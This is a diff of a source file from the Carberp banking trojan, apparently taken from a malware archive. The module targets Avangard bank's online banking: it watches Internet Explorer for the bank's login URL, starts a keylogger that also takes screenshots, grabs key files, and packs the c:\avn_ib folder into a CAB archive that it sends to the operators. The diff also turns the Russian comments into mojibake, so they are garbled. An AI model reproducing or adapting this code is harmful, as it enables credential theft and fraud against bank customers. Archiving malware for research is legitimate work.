@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "GetApi.h"
 #include "Strings.h"
 #include "Memory.h"
@@ -15,13 +26,13 @@ namespace DBGAVANGARDWEB
 
 #define DBGAVG DBGAVANGARDWEB::DBGOutMessage<>
 
-#define AvangardWebModule //говорим что модуль включен
+#define AvangardWebModule //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 namespace AvangardWeb
 {
 	PKeyLogSystem System = 0;
 
-	//true - если файл является файлом ключем, а также отсылает его в админку
+	//true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int IsFileKey( FileGrabber::ParamEvent* e )
 	{
 		if( e->data )
@@ -44,7 +55,7 @@ namespace AvangardWeb
 		rv->maxSize = 500;
 		rv->aw |= FileGrabber::LOADFILE | FileGrabber::FILEISBIN;
 		const char gifFormat[] = { 'G', 'I', 'F', 0 };
-		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //игнорируем формат gif
+		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ gif
 		FileGrabber::AddReceiver(rv);
 
 		System = (PKeyLogSystem)Sender;
@@ -60,18 +71,18 @@ namespace AvangardWeb
 		}
 	}
 
-	//запуск кейлогера
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	void InitKeyLogger()
 	{
-		DBGAVG( "Avangard", "Запуск кейлогера" );
+		DBGAVG( "Avangard", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		PKeyLogSystem S = KeyLogger::AddSystem("avangard", PROCESS_HASH_IE);
 		if( S != NULL )
 		{
 			S->SendLogAsCAB = true;
-			// Устанавливаем режим работы в одном фильтре и не меньше указанного
-			// времени
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			S->TimeMode    = KLG_TIME_MIN;
-			S->TimeValue   = 5*60; // Система будет работать не менее 5-ти минут
+			S->TimeValue   = 5*60; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 5-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			S->MakeScreenShot = true;
 
 			S->OnActivate = Activeted;
@@ -85,14 +96,14 @@ namespace AvangardWeb
 		char* url = (char*)Data;
 		if( System == 0 )
 		{
-			//реагируем когда в урле есть слово avangard и далее logon_enter
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ avangard пїЅ пїЅпїЅпїЅпїЅпїЅ logon_enter
 			char* p = m_strstr( url, "avangard" );
 			if( p )
 			{
 				p += 8;
 				if( m_strstr( url, "logon_enter" ) )
 				{
-					DBGAVG( "Avangard", "Урл %s", url );
+					DBGAVG( "Avangard", "пїЅпїЅпїЅ %s", url );
 					InitKeyLogger();
 				}
 			}
@@ -101,36 +112,36 @@ namespace AvangardWeb
 
 	void Init()
 	{
-		//Устанавляем событие на смену урла в ИЕ
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ
 		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
 	}
 
 	void SendFolder_avn_ib()
 	{
-		//формируем уникальное имя файла
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		char path[MAX_PATH];
 		char* avn_ib = "c:\\avn_ib";
 		pGetTempPathA( sizeof(path), path );
 		pPathAppendA( path, "avn_ib" );
 		char* path2 = UIDCrypt::CryptFileName( path, true );
 		if( File::IsExists(path2) )
-			DBGAVG( "Avangard", "Папка %s уже отсылалась (метка %s)", avn_ib, path2 );
+			DBGAVG( "Avangard", "пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ %s)", avn_ib, path2 );
 		else
 		{
 			if( Directory::IsExists(avn_ib) )
 			{
-				DBGAVG( "Avangard", "Папка %s существует, отсылаем ее содержимое (метка %s)", avn_ib, path2 );
+				DBGAVG( "Avangard", "пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ %s)", avn_ib, path2 );
 				char tmpName[MAX_PATH];
 				File::GetTempName(tmpName);
 				HCAB cab = CreateCab(tmpName);
 				AddDirToCab( cab, avn_ib, "avn_ib" );
 				CloseCab(cab);
 				DataGrabber::SendCabDelayed( 0, tmpName, "avangard" );
-				File::WriteBufferA( path2, 0, 0 ); //помечаем, что отсылка уже была
+				File::WriteBufferA( path2, 0, 0 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				pDeleteFileA(tmpName);
 			}
 			else
-				DBGAVG( "Avangard", "Папки %s не существует", avn_ib );
+				DBGAVG( "Avangard", "пїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", avn_ib );
 		}
 		STR::Free(path2);
 	}
